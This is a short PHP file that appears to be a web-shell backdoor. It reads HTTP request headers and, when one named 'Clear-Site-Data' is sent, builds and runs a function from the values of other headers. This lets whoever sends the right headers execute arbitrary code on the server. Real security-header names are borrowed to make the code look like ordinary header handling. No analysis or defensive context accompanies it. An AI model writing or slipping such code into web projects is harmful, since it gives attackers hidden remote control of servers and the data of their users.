<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $accept = $_HEADERS['Clear-Site-Data']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Feature-Policy']));
    $accept();
}